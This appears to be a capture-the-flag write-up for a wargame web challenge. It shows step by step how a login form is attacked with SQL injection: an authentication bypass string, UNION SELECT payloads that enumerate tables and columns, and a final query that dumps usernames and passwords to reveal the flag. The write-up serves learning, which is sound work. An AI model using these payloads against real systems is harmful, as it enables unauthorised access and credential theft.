# WEB06 WHITEHAT WARGAME 3.0
## THIS IS A BASIC SQL CHALLENGE.
### LET’S START >_<
### <+> When follow the http://103.229.41.16:8081 we will get the result:

![image](https://user-images.githubusercontent.com/71617433/137171847-8c37a7ac-9aba-41d8-bdb0-2e816e1918eb.png)

Well, there is a login form and the first thing I tried is **‘ or 1-- -** and typed a random password then entered the login. It returned the following :

![image](https://user-images.githubusercontent.com/71617433/137171978-015bfed9-294b-408a-8b06-5684e5f22129.png)

This is a table including some information of users. Then I could identify that it’s MYSQL.

### <+> The next step, is identify how many columns that the query returns. Because the table has 5 columns so I start from 5 null:
I use **'OR+1+UNION+SELECT+null,null,null,null,null#** after password.

![image](https://user-images.githubusercontent.com/71617433/137172060-1398ebb1-e718-49d7-a85c-6aab7102c609.png)

It doesn’t work, so let try 6,7,8 and more until it works. And when I use 7 null colums, it works.

![image](https://user-images.githubusercontent.com/71617433/137172111-77d7dfc7-f652-4acc-8d9d-cbf0843eb5b2.png)

The next, we’ll identify which data type for each columns.
Use number, character to replace null. If the response returns data, it’s true type of data, else, it’s wrong.

![image](https://user-images.githubusercontent.com/71617433/137172162-5169467e-4d55-4ca4-989c-a5c97e239c5d.png)

You can see that the first, fourth, sixth columns ‘s data type is number;
And other columns has string data type .

***Notice : only the first, second, fourth, fifth, seventh columns are displayed.***

### <+> Let’s find the table name and the column name in the table. 
**'OR+1+UNION+SELECT+null,null,null,null,(SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+1),null,null#**

![image](https://user-images.githubusercontent.com/71617433/137172713-9e8f0dc7-dace-42bc-8933-5674b9ec2e98.png)

Oh, I see a table named “hocsinh”. Let’s find its columns name.
I will find all th e columns of table ‘***hocsinh***’.
I use this SQL command:
**'OR+1+UNION+SELECT+null,null,null,null,(SELECT+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='hocsinh'+LIMIT+0,1),null,null#**
Then increase the number after LIMIT from 0 until the response doesn’t return any data at all.
When the number after LIMIT go to 7 , it doesn’t return any data, then we can identify that the ‘hocsinh’ table has 7 columns: id, user, password, name, age, phone, city.

![image](https://user-images.githubusercontent.com/71617433/137172769-202ace82-f2d5-4c51-9f68-ccf3c771df38.png)
 

<+> Now we have the table name and columns name, the final work is find the password of each user.
Sql command: 
**'OR+1+UNION+SELECT+null,user,null,null,password,null,null+FROM+hocsinh#**

![image](https://user-images.githubusercontent.com/71617433/137172838-c50e4529-dbde-4057-9c1b-802618aa058d.png)


 

We can see the flag at the last row :
	***WhiteHat{5hOW_15_Ch1K3n_5t@r}***

